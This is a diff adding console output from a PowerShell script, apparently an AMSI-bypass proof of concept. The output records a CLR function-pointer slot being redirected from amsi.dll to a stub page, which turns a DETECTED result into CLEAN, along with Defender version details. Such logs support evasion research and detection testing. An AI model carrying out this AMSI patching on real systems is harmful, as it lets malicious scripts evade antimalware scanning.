@@ -1,0 +1,11 @@
+PS C:\Users\Public> .\clr-slot.ps1
+slot addr = 0x7ffd28449870
+orig fn   = 0x7ffd36e08160   (inside amsi.dll)
+ctrl_start   slot=0x7ffd36e08160  result=32768  (oracle alive)
+A_baseline   slot=0x7ffd36e08160  result=32768  DETECTED  (slot inside amsi.dll)
+B_patched    slot=0x15553a70000   result=1      CLEAN     (slot inside stub page)
+C_restored   slot=0x7ffd36e08160  result=32768  DETECTED  (slot restored to amsi.dll)
+ctrl_end     slot=0x7ffd36e08160  result=32768  (oracle alive)
+sig   : 1.459.576.0
+engine: 1.1.26080.3
+build : 10.0.26200
